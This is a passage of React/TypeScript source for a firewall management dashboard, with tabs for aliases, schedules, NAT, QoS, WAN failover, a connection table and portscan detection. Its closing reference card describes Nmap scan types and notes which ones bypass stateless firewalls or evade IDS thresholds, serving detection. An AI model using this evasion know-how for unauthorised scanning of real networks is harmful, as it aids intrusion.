            { t:"Port Alias", d:"Port numbers or ranges. Example: 80, 443, 8080:8090. Use in destination port fields instead of repeating port lists across rules." },
            { t:"URL Table", d:"A remote URL that returns a newline-separated IP list. ProxhqVPN auto-fetches and updates this list on a schedule." },
            { t:"GeoIP Alias", d:"Named country codes (e.g. CN, RU, KP). ProxhqVPN resolves these to their CIDR ranges for blocking or allowing by geography." },
            { t:"Rule Reference", d:"Aliases appear anywhere you'd type an IP/port in rules. Write ADMIN_IPS as source instead of listing 20 IPs — the firewall expands them at match time." },
          ].map(card => (
            <div key={card.t} style={{ background:"#111", borderRadius:6, padding:12 }}>
              <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#00ff88", marginBottom:6 }}>{card.t}</div>
              <p style={{ margin:0, fontSize:11, color:"#666", lineHeight:1.6 }}>{card.d}</p>
            </div>
          ))}
        </div>
      </CardBox>
    </div>
  );
}

// ── 2. SCHEDULE-BASED RULES ──────────────────────────────────────────────────
function SchedulesTab() {
  const { data, loading, reload } = useFw<{ schedules: Array<{id:number;name:string;daysOfWeek:string;timeStart:string;timeEnd:string;timezone:string;enabled:boolean;isActive:boolean;description:string|null}> }>("/schedules");
  const [form, setForm] = useState({ name:"", daysOfWeek:"1,2,3,4,5", timeStart:"09:00", timeEnd:"17:00", timezone:"UTC", description:"" });
  const [saving, setSaving] = useState(false);

  const DAYS = ["Sun","Mon","Tue","Wed","Thu","Fri","Sat"];
  const dayLabel = (str: string) => str.split(",").map(d=>DAYS[parseInt(d)]??"?").join(", ");

  const save = async () => {
    if (!form.name) return;
    setSaving(true);
    await fwPost("/schedules", form);
    setForm({ name:"", daysOfWeek:"1,2,3,4,5", timeStart:"09:00", timeEnd:"17:00", timezone:"UTC", description:"" });
    await reload(); setSaving(false);
  };

  return (
    <div>
      <CardBox title="📅 Schedule-Based Firewall Rules (pfSense/OPNsense/IPFire)" action={<Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>}>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>Create named time schedules and bind them to firewall rules. Identical to pfSense schedules — block social media 9–5 on weekdays, allow gaming only on weekends, restrict downloads to off-peak hours.</p>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr 1fr 1fr 1fr auto", gap:8, marginBottom:12 }}>
          <FwInput placeholder="Schedule name" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwInput placeholder="Days (0=Sun,1=Mon…)" value={form.daysOfWeek} onChange={e=>setForm(f=>({...f,daysOfWeek:e.target.value}))} title="Comma-separated day numbers: 0=Sunday, 1=Monday, … 6=Saturday" />
          <FwInput type="time" value={form.timeStart} onChange={e=>setForm(f=>({...f,timeStart:e.target.value}))} />
          <FwInput type="time" value={form.timeEnd} onChange={e=>setForm(f=>({...f,timeEnd:e.target.value}))} />
          <FwInput placeholder="Timezone (e.g. UTC)" value={form.timezone} onChange={e=>setForm(f=>({...f,timezone:e.target.value}))} />
          <FwInput placeholder="Description" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>
        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Days</TH><TH>Time Window</TH><TH>Timezone</TH><TH>Status</TH><TH>Description</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.schedules?.length ? <EmptyRow cols={7} msg="No schedules defined yet."/> : data.schedules.map(s => (
                <tr key={s.id}>
                  <TD mono c="#ff9900">{s.name}</TD>
                  <TD c="#888">{dayLabel(s.daysOfWeek)}</TD>
                  <TD mono c="#ccc">{s.timeStart} – {s.timeEnd}</TD>
                  <TD mono c="#666">{s.timezone}</TD>
                  <TD><Bdg label={s.isActive?"ACTIVE":"INACTIVE"} color={s.isActive?"#00ff88":"#333"} sm/></TD>
                  <TD c="#555">{s.description ?? "—"}</TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{ await fwPut(`/schedules/${s.id}`,{enabled:!s.enabled}); await reload(); }} color={s.enabled?"#ff9900":"#00ff88"} sm>{s.enabled?"Disable":"Enable"}</Btn>
                      <Btn onClick={async()=>{ await fwDelete(`/schedules/${s.id}`); await reload(); }} color="#ff4444" sm><Trash2 size={10}/></Btn>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
      <CardBox title="⏰ Schedule Examples">
        <div style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:10 }}>
          {[
            { name:"Business Hours Block", days:"Mon–Fri", time:"09:00–17:00", use:"Block social media, gaming sites, video streaming on corporate networks during work hours." },
            { name:"Weekend Gaming",       days:"Sat–Sun", time:"All day",    use:"Allow gaming traffic only on weekends. Bind to a firewall rule that allows high-bandwidth game server IPs." },
            { name:"Off-Peak Backup",      days:"Daily",   time:"02:00–05:00",use:"Allow large transfers and backup jobs only in the early morning hours to avoid congesting the network." },
            { name:"After-Hours Admin",    days:"Mon–Fri", time:"18:00–23:59",use:"Restrict remote admin access (SSH/RDP) to after business hours to reduce attack surface during peak vulnerability windows." },
            { name:"Kids Screen Time",     days:"Sat–Sun", time:"10:00–20:00",use:"Allow kids' device alias access to entertainment/gaming sites only during permitted weekend hours." },
            { name:"Update Window",        days:"Tue",     time:"03:00–04:00",use:"Allow outbound connections to OS update servers only on Patch Tuesday at 3am to control update timing." },
          ].map(ex => (
            <div key={ex.name} style={{ background:"#111", borderRadius:6, padding:12 }}>
              <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff9900", marginBottom:4 }}>{ex.name}</div>
              <div style={{ fontSize:10, color:"#4488ff", marginBottom:6 }}>{ex.days} · {ex.time}</div>
              <p style={{ margin:0, fontSize:11, color:"#666", lineHeight:1.5 }}>{ex.use}</p>
            </div>
          ))}
        </div>
      </CardBox>
    </div>
  );
}

// ── 3. NAT / PORT FORWARDING ─────────────────────────────────────────────────
function NatTab() {
  const { data, loading, reload } = useFw<{ rules: Array<{id:number;name:string;natType:string;protocol:string;interface:string;destPort:string|null;natIp:string;natPort:string|null;enabled:boolean;hitCount:number;description:string|null}> }>("/nat");
  const [form, setForm] = useState({ name:"", natType:"port_forward", protocol:"tcp", interface:"WAN", destPort:"", natIp:"", natPort:"", description:"" });
  const [saving, setSaving] = useState(false);

  const NAT_COLOR: Record<string,string> = { port_forward:"#00ff88", nat_1to1:"#4488ff", outbound:"#ff9900", npt:"#cc44ff" };

  const save = async () => {
    if (!form.name || !form.natIp) return;
    setSaving(true);
    await fwPost("/nat", form);
    setForm({ name:"", natType:"port_forward", protocol:"tcp", interface:"WAN", destPort:"", natIp:"", natPort:"", description:"" });
    await reload(); setSaving(false);
  };
  const getScript = async () => {
    const r = await fetch(`${API}/nat/generate-iptables`);
    const text = await r.text();
    const blob = new Blob([text], { type:"text/plain" });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement("a"); a.href=url; a.download="nat-rules.sh"; a.click();
  };

  return (
    <div>
      <CardBox title="🔀 NAT / Port Forwarding Rules (pfSense/OPNsense)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={getScript} color="#4488ff" sm><Download size={10}/> iptables Script</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Configure NAT rules: Port Forwarding (expose an internal service on WAN), 1:1 NAT (map a WAN IP 1:1 to an internal host), Outbound NAT (masquerade internal traffic), and NPt (IPv6 prefix translation).
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr 1fr 1fr 1fr 1fr auto", gap:6, marginBottom:12 }}>
          <FwInput placeholder="Rule name" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.natType} onChange={e=>setForm(f=>({...f,natType:e.target.value}))}>
            <option value="port_forward">Port Forward</option>
            <option value="nat_1to1">1:1 NAT</option>
            <option value="outbound">Outbound NAT</option>
            <option value="npt">NPt (IPv6)</option>
          </FwSelect>
          <FwSelect value={form.protocol} onChange={e=>setForm(f=>({...f,protocol:e.target.value}))}>
            <option>tcp</option><option>udp</option><option>tcp/udp</option><option>any</option>
          </FwSelect>
          <FwInput placeholder="Interface (WAN)" value={form.interface} onChange={e=>setForm(f=>({...f,interface:e.target.value}))} />
          <FwInput placeholder="Ext. port (e.g. 8080)" value={form.destPort} onChange={e=>setForm(f=>({...f,destPort:e.target.value}))} />
          <FwInput placeholder="Internal IP" value={form.natIp} onChange={e=>setForm(f=>({...f,natIp:e.target.value}))} />
          <FwInput placeholder="Internal port" value={form.natPort} onChange={e=>setForm(f=>({...f,natPort:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>
        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Type</TH><TH>Proto</TH><TH>Interface</TH><TH>Ext Port</TH><TH>→ Internal</TH><TH>Hits</TH><TH>Status</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.rules?.length ? <EmptyRow cols={9} msg="No NAT rules defined yet."/> : data.rules.map(r => (
                <tr key={r.id}>
                  <TD c="#fff">{r.name}</TD>
                  <TD><Bdg label={r.natType.replace("_"," ")} color={NAT_COLOR[r.natType]??"#888"} sm/></TD>
                  <TD mono c="#ff9900">{r.protocol}</TD>
                  <TD mono c="#888">{r.interface}</TD>
                  <TD mono c="#ccc">{r.destPort ?? "any"}</TD>
                  <TD mono c="#00ff88">{r.natIp}{r.natPort?`:${r.natPort}`:""}</TD>
                  <TD mono c="#ff9900">{r.hitCount}</TD>
                  <TD><Bdg label={r.enabled?"ON":"OFF"} color={r.enabled?"#00ff88":"#444"} sm/></TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{ await fwPut(`/nat/${r.id}`,{enabled:!r.enabled}); await reload(); }} color={r.enabled?"#ff9900":"#00ff88"} sm>{r.enabled?"Off":"On"}</Btn>
                      <Btn onClick={async()=>{ await fwDelete(`/nat/${r.id}`); await reload(); }} color="#ff4444" sm><Trash2 size={10}/></Btn>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
    </div>
  );
}

// ── 4. QoS / TRAFFIC SHAPING ─────────────────────────────────────────────────
function QosTab() {
  const { data, loading, reload } = useFw<{ rules: Array<{id:number;name:string;description:string|null;direction:string;protocol:string;destPort:string|null;action:string;bandwidthKbps:number|null;burstKbps:number|null;priority:number;enabled:boolean;hitCount:number}> }>("/qos");
  const [form, setForm] = useState({ name:"", direction:"both", protocol:"any", destPort:"", action:"limit", bandwidthKbps:"", priority:"5", description:"" });
  const [saving, setSaving] = useState(false);

  const ACTION_COLOR: Record<string,string> = { limit:"#ff9900", priority:"#00ff88", guarantee:"#4488ff", drop:"#ff4444" };
  const PRIO_LABEL = ["","Highest","High","Med-High","Medium","Normal","Med-Low","Low","Lowest"];

  const save = async () => {
    if (!form.name) return;
    setSaving(true);
    await fwPost("/qos", { ...form, bandwidthKbps: form.bandwidthKbps?parseInt(form.bandwidthKbps):undefined, priority:parseInt(form.priority) });
    setForm({ name:"", direction:"both", protocol:"any", destPort:"", action:"limit", bandwidthKbps:"", priority:"5", description:"" });
    await reload(); setSaving(false);
  };
  const getTcScript = async () => {
    const r = await fetch(`${API}/qos/generate-tc`);
    const text = await r.text();
    const blob = new Blob([text], { type:"text/plain" });
    const a = document.createElement("a"); a.href=URL.createObjectURL(blob); a.download="qos-tc.sh"; a.click();
  };

  return (
    <div>
      <CardBox title="📊 Traffic Shaping / QoS Rules (pfSense/OPNsense/IPFire)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={async()=>{await fwPost("/qos/seed",{}); await reload();}} color="#4488ff" sm>Seed Defaults</Btn>
          <Btn onClick={getTcScript} color="#cc44ff" sm><Download size={10}/> tc Script</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Control bandwidth allocation with hierarchical token-bucket shaping. Limit P2P, prioritize VoIP/video calls, guarantee SSH management bandwidth. Generates Linux tc (traffic control) HFSC/HTB scripts.
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"1.5fr 1fr 1fr 1fr 1fr 1fr 1fr auto", gap:6, marginBottom:12 }}>
          <FwInput placeholder="Rule name" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.direction} onChange={e=>setForm(f=>({...f,direction:e.target.value}))}>
            <option value="inbound">Inbound</option><option value="outbound">Outbound</option><option value="both">Both</option>
          </FwSelect>
          <FwSelect value={form.action} onChange={e=>setForm(f=>({...f,action:e.target.value}))}>
            <option value="limit">Limit Bandwidth</option>
            <option value="priority">Prioritize</option>
            <option value="guarantee">Guarantee</option>
            <option value="drop">Drop Excess</option>
          </FwSelect>
          <FwInput placeholder="Max Kbps (e.g. 2048)" value={form.bandwidthKbps} onChange={e=>setForm(f=>({...f,bandwidthKbps:e.target.value}))} />
          <FwInput placeholder="Dest port/range" value={form.destPort} onChange={e=>setForm(f=>({...f,destPort:e.target.value}))} />
          <FwSelect value={form.priority} onChange={e=>setForm(f=>({...f,priority:e.target.value}))}>
            {PRIO_LABEL.slice(1).map((l,i)=><option key={i+1} value={i+1}>{i+1} — {l}</option>)}
          </FwSelect>
          <FwInput placeholder="Description" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>
        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Dir</TH><TH>Action</TH><TH>Bandwidth</TH><TH>Port</TH><TH>Priority</TH><TH>Hits</TH><TH>Status</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.rules?.length ? <EmptyRow cols={9} msg="No QoS rules yet. Click 'Seed Defaults' to load VoIP/P2P/SSH presets."/> : data.rules.map(r=>(
                <tr key={r.id}>
                  <TD c="#fff">{r.name}</TD>
                  <TD mono c="#888">{r.direction}</TD>
                  <TD><Bdg label={r.action} color={ACTION_COLOR[r.action]??"#888"} sm/></TD>
                  <TD mono c="#ff9900">{r.bandwidthKbps ? `${r.bandwidthKbps} Kbps` : "—"}</TD>
                  <TD mono c="#ccc">{r.destPort ?? "any"}</TD>
                  <TD mono c="#4488ff">{r.priority} — {PRIO_LABEL[r.priority]??""}</TD>
                  <TD mono c="#ff9900">{r.hitCount}</TD>
                  <TD><Bdg label={r.enabled?"ON":"OFF"} color={r.enabled?"#00ff88":"#444"} sm/></TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{await fwPut(`/qos/${r.id}`,{enabled:!r.enabled}); await reload();}} color={r.enabled?"#ff9900":"#00ff88"} sm>{r.enabled?"Off":"On"}</Btn>
                      <Btn onClick={async()=>{await fwDelete(`/qos/${r.id}`); await reload();}} color="#ff4444" sm><Trash2 size={10}/></Btn>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
    </div>
  );
}

// ── 5. WAN LOAD BALANCING / FAILOVER ─────────────────────────────────────────
function WanGroupsTab() {
  const { data, loading, reload } = useFw<{ groups: Array<{id:number;name:string;mode:string;interfaces:string;triggerLevel:string;enabled:boolean;description:string|null}> }>("/wan-groups");
  const [form, setForm] = useState({ name:"", mode:"failover", interfaces:'[{"iface":"eth0","gateway":"192.168.1.1","weight":1,"priority":1}]', triggerLevel:"packetloss", description:"" });
  const [saving, setSaving] = useState(false);
  const MODE_COLOR: Record<string,string> = { failover:"#ff9900", load_balance:"#00ff88", round_robin:"#4488ff" };

  const save = async () => {
    if (!form.name) return;
    setSaving(true);
    await fwPost("/wan-groups", form);
    setForm({ name:"", mode:"failover", interfaces:'[{"iface":"eth0","gateway":"192.168.1.1","weight":1,"priority":1}]', triggerLevel:"packetloss", description:"" });
    await reload(); setSaving(false);
  };

  return (
    <div>
      <CardBox title="🌐 WAN Load Balancing / Failover Groups (pfSense/OPNsense)" action={<Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>}>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Group multiple WAN uplinks for automatic failover or load balancing. Supports failover (primary/secondary), load-balance (distribute sessions across WANs by weight), and round-robin. Trigger on packet loss, latency spike, or link down.
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr 1fr 2fr auto", gap:6, marginBottom:12 }}>
          <FwInput placeholder="Group name (e.g. TIER1_WAN)" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.mode} onChange={e=>setForm(f=>({...f,mode:e.target.value}))}>
            <option value="failover">Failover (Primary/Secondary)</option>
            <option value="load_balance">Load Balance (by weight)</option>
            <option value="round_robin">Round Robin</option>
          </FwSelect>
          <FwSelect value={form.triggerLevel} onChange={e=>setForm(f=>({...f,triggerLevel:e.target.value}))}>
            <option value="packetloss">Packet Loss</option>
            <option value="latency">High Latency</option>
            <option value="down">Link Down Only</option>
          </FwSelect>
          <FwInput placeholder="Description" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <FwInput placeholder='[{"iface":"eth0","gateway":"10.0.0.1","weight":1,"priority":1}]' value={form.interfaces} onChange={e=>setForm(f=>({...f,interfaces:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>
        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Mode</TH><TH>Trigger Level</TH><TH>Interfaces</TH><TH>Status</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.groups?.length ? <EmptyRow cols={6} msg="No WAN groups configured."/> : data.groups.map(g => {
                let ifaces: Array<{iface:string;gateway:string;weight:number;priority:number}> = [];
                try { ifaces = JSON.parse(g.interfaces); } catch {}
                return (
                  <tr key={g.id}>
                    <TD mono c="#fff">{g.name}</TD>
                    <TD><Bdg label={g.mode.replace("_"," ")} color={MODE_COLOR[g.mode]??"#888"} sm/></TD>
                    <TD mono c="#888">{g.triggerLevel}</TD>
                    <td style={{ padding:"6px 10px", borderBottom:"1px solid #111", fontSize:11 }}>
                      {ifaces.map((i,idx)=>(
                        <span key={idx} style={{ marginRight:8, color:"#ccc", fontFamily:"monospace" }}>
                          {i.iface}<span style={{ color:"#555" }}> → {i.gateway}</span> <span style={{ color:"#888", fontSize:10 }}>w:{i.weight}</span>
                        </span>
                      ))}
                    </td>
                    <TD><Bdg label={g.enabled?"ON":"OFF"} color={g.enabled?"#00ff88":"#444"} sm/></TD>
                    <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                      <div style={{ display:"flex", gap:4 }}>
                        <Btn onClick={async()=>{await fwPut(`/wan-groups/${g.id}`,{enabled:!g.enabled}); await reload();}} color={g.enabled?"#ff9900":"#00ff88"} sm>{g.enabled?"Disable":"Enable"}</Btn>
                        <Btn onClick={async()=>{await fwDelete(`/wan-groups/${g.id}`); await reload();}} color="#ff4444" sm><Trash2 size={10}/></Btn>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        )}
      </CardBox>
      <CardBox title="📚 WAN Group Modes Explained">
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:12 }}>
          {[
            { mode:"Failover", color:"#ff9900", desc:"Assigns a priority order to uplinks. Traffic flows through the highest-priority active interface. When it fails (detected by packet loss/latency/link-down), traffic automatically shifts to the next interface. Zero manual intervention required." },
            { mode:"Load Balance", color:"#00ff88", desc:"Distributes new sessions across multiple WAN interfaces according to their weight. A weight-2 link gets twice the sessions of a weight-1 link. Existing sessions stay on their assigned interface until closed." },
            { mode:"Round Robin", color:"#4488ff", desc:"Assigns each new connection to the next WAN interface in sequence, cycling through all active uplinks equally. Simple and fair, but does not account for interface speed differences — use Load Balance if uplinks have different capacities." },
          ].map(m=>(
            <div key={m.mode} style={{ background:"#111", borderRadius:6, padding:12 }}>
              <div style={{ fontFamily:"monospace", fontSize:12, fontWeight:700, color:m.color, marginBottom:8 }}>{m.mode}</div>
              <p style={{ margin:0, fontSize:11, color:"#666", lineHeight:1.6 }}>{m.desc}</p>
            </div>
          ))}
        </div>
      </CardBox>
    </div>
  );
}

// ── 6. CONNECTION STATE TABLE ─────────────────────────────────────────────────
function StateTableTab() {
  const { data, loading, reload } = useFw<{ states: Array<{proto:string;state:string;recv:string;send:string;localAddr:string;peerAddr:string;process:string;isBlocked:boolean}>; total:number; established:number; timeWait:number; listening:number }>("/state-table");
  const [search, setSearch] = useState("");

  const STATE_COLOR: Record<string,string> = { ESTABLISHED:"#00ff88", LISTEN:"#4488ff", "TIME-WAIT":"#ff9900", CLOSE_WAIT:"#ff6600", FIN_WAIT1:"#888", FIN_WAIT2:"#888", SYN_SENT:"#ffaa00", SYN_RECV:"#cc44ff" };

  const filtered = (data?.states ?? []).filter(s =>
    !search || s.peerAddr.includes(search) || s.localAddr.includes(search) || s.process.includes(search) || s.proto.includes(search)
  );

  return (
    <div>
      <CardBox title="🔌 Connection State Table (pfSense/OPNsense live ss output)" action={
        <div style={{ display:"flex", gap:8, alignItems:"center" }}>
          <FwInput placeholder="Filter by IP / process…" value={search} onChange={e=>setSearch(e.target.value)} style={{ width:200 }} />
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/> Refresh</Btn>
        </div>
      }>
        <div style={{ display:"flex", gap:20, marginBottom:14 }}>
          {[{l:"Total",v:data?.total??0,c:"#ccc"},{l:"Established",v:data?.established??0,c:"#00ff88"},{l:"Time-Wait",v:data?.timeWait??0,c:"#ff9900"},{l:"Listening",v:data?.listening??0,c:"#4488ff"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center" }}>
              <div style={{ fontFamily:"monospace", fontSize:18, fontWeight:700, color:s.c }}>{s.v}</div>
              <div style={{ fontSize:10, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>
        {loading ? <Spinner/> : (
          <div style={{ maxHeight:400, overflowY:"auto" }}>
            <table style={{ width:"100%", borderCollapse:"collapse" }}>
              <thead><tr><TH>Proto</TH><TH>State</TH><TH>Local Address</TH><TH>Peer Address</TH><TH>Recv-Q</TH><TH>Send-Q</TH><TH>Process</TH><TH>Threat</TH></tr></thead>
              <tbody>
                {!filtered.length ? <EmptyRow cols={8} msg="No active connections found."/> : filtered.map((s,i)=>(
                  <tr key={i} style={{ background: s.isBlocked?"#ff220211":"transparent" }}>
                    <TD mono c="#4488ff">{s.proto}</TD>
                    <TD><Bdg label={s.state||"—"} color={STATE_COLOR[s.state]??"#555"} sm/></TD>
                    <TD mono c="#888">{s.localAddr}</TD>
                    <TD mono c={s.isBlocked?"#ff4444":"#ccc"}>{s.peerAddr}</TD>
                    <TD mono c="#666">{s.recv}</TD>
                    <TD mono c="#666">{s.send}</TD>
                    <TD mono c="#555">{s.process||"—"}</TD>
                    <TD>{s.isBlocked?<Bdg label="BLOCKED" color="#ff4444" sm/>:"—"}</TD>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </CardBox>
    </div>
  );
}

// ── 7. PORTSCAN DETECTION ─────────────────────────────────────────────────────
function PortscansTab() {
  const { data, loading, reload } = useFw<{ events: Array<{id:number;sourceIp:string;destIp:string|null;scanType:string;portCount:number;tcpFlags:string|null;packetCount:number;blocked:boolean;addedToBlock:boolean;geoCountry:string|null;detectedAt:string}> }>("/portscans");
  const [testForm, setTestForm] = useState({ sourceIp:"", ports:"22,80,443,3306,5432,8080,8443", tcpFlags:"SYN" });
  const [testResult, setTestResult] = useState<{scanType:string;autoBlocked:boolean}|null>(null);
  const [testing, setTesting] = useState(false);

  const SCAN_COLOR: Record<string,string> = { syn:"#ff4444", fin:"#ff9900", xmas:"#cc44ff", null:"#4488ff", ack:"#ffaa00", udp:"#00aaff", slow:"#888" };

  const runTest = async () => {
    if (!testForm.sourceIp) return;
    setTesting(true);
    const ports = testForm.ports.split(",").map(p=>parseInt(p.trim())).filter(Boolean);
    const res = await fwPost("/portscans/detect", { ...testForm, ports });
    setTestResult(res);
    await reload();
    setTesting(false);
  };

  return (
    <div>
      <CardBox title="🔍 Portscan Detection Engine (Snort sfPortscan / Suricata)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={async()=>{await fwDelete("/portscans"); await reload();}} color="#ff4444" sm><Trash2 size={10}/> Clear Log</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Detects SYN, FIN, XMAS, NULL, ACK, UDP, Maimon, and slow-rate port scans. Automatically blocks aggressive scanners (&gt;20 ports) by adding them to the firewall blacklist. Equivalent to Snort's sfPortscan preprocessor and Suricata's portscan detection.
        </p>
        {/* Test Detector */}
        <div style={{ background:"#111", borderRadius:6, padding:12, marginBottom:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff9900", marginBottom:8 }}>🧪 Test Portscan Detector</div>
          <div style={{ display:"flex", gap:8, alignItems:"center", flexWrap:"wrap" }}>
            <FwInput placeholder="Source IP to simulate" value={testForm.sourceIp} onChange={e=>setTestForm(f=>({...f,sourceIp:e.target.value}))} />
            <FwInput placeholder="Ports (comma-sep)" value={testForm.ports} onChange={e=>setTestForm(f=>({...f,ports:e.target.value}))} style={{ width:250 }} />
            <FwSelect value={testForm.tcpFlags} onChange={e=>setTestForm(f=>({...f,tcpFlags:e.target.value}))}>
              <option value="SYN">SYN Scan</option>
              <option value="FIN">FIN Scan</option>
              <option value="URG|PSH|FIN">XMAS Scan</option>
              <option value="NULL">NULL Scan</option>
              <option value="ACK">ACK Scan</option>
              <option value="WINDOW">Window Scan</option>
            </FwSelect>
            <Btn onClick={runTest} color="#ff9900">{testing?"Detecting…":"Detect"}</Btn>
            {testResult && (
              <div style={{ fontFamily:"monospace", fontSize:11 }}>
                <Bdg label={testResult.scanType.toUpperCase()} color={SCAN_COLOR[testResult.scanType]??"#888"} sm/>
                {testResult.autoBlocked && <Bdg label="AUTO-BLOCKED" color="#ff4444" sm/>}
              </div>
            )}
          </div>
        </div>

        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Source IP</TH><TH>Scan Type</TH><TH>TCP Flags</TH><TH>Ports</TH><TH>Packets</TH><TH>Blocked</TH><TH>Time</TH></tr></thead>
            <tbody>
              {!data?.events?.length ? <EmptyRow cols={7} msg="No portscan events logged. Use the test tool above to simulate a scan."/> : data.events.map(e=>(
                <tr key={e.id} style={{ background: e.blocked?"#ff220211":"transparent" }}>
                  <TD mono c={e.blocked?"#ff4444":"#fff"}>{e.sourceIp}</TD>
                  <TD><Bdg label={e.scanType.toUpperCase()} color={SCAN_COLOR[e.scanType]??"#888"} sm/></TD>
                  <TD mono c="#888">{e.tcpFlags ?? "—"}</TD>
                  <TD mono c="#ff9900">{e.portCount} ports</TD>
                  <TD mono c="#666">{e.packetCount}</TD>
                  <TD>{e.blocked?<Bdg label={e.addedToBlock?"BLACKLISTED":"BLOCKED"} color="#ff4444" sm/>:"—"}</TD>
                  <TD mono c="#444">{new Date(e.detectedAt).toLocaleString()}</TD>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
      <CardBox title="📋 Port Scan Types Reference">
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:10 }}>
          {[
            { type:"SYN (Half-Open)", flags:"SYN", color:"#ff4444", desc:"Most common. Sends SYN, waits for SYN-ACK, never completes handshake. Stealthy, fast, and reliable. Used by Nmap -sS." },
            { type:"FIN Scan",        flags:"FIN", color:"#ff9900", desc:"Sends FIN packet. Open ports ignore it; closed ports reply RST. Bypasses some stateless firewalls and older IDS. Nmap -sF." },
            { type:"XMAS Scan",       flags:"FIN+URG+PSH", color:"#cc44ff", desc:"All flags set — 'lit up like a Christmas tree'. Same behavior as FIN scan. Stands out in packet captures. Nmap -sX." },
            { type:"NULL Scan",       flags:"(none)", color:"#4488ff", desc:"No flags set. Open ports ignore; closed ports reply RST. Often evades simple ACL rules expecting standard flags. Nmap -sN." },
            { type:"ACK Scan",        flags:"ACK", color:"#ffaa00", desc:"Maps firewall rules by probing filtered vs unfiltered ports. Cannot detect open/closed — only whether filtered. Nmap -sA." },
            { type:"UDP Scan",        flags:"UDP", color:"#00aaff", desc:"Sends UDP packets. No response = open|filtered; ICMP unreachable = closed. Slow and unreliable but necessary for UDP services." },
            { type:"Window Scan",     flags:"RST+ACK", color:"#888", desc:"Exploits TCP window size in RST packets. Behavior is OS-dependent — may reveal open ports on certain OS versions." },
            { type:"Slow/Decoy Scan", flags:"SYN (slow)", color:"#666", desc:"Spreads probes over a long time window (minutes/hours) to evade rate-based IDS detection thresholds. Detected by sustained port spread." },
          ].map(s=>(
            <div key={s.type} style={{ background:"#111", borderRadius:6, padding:10 }}>
              <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:s.color, marginBottom:4 }}>{s.type}</div>
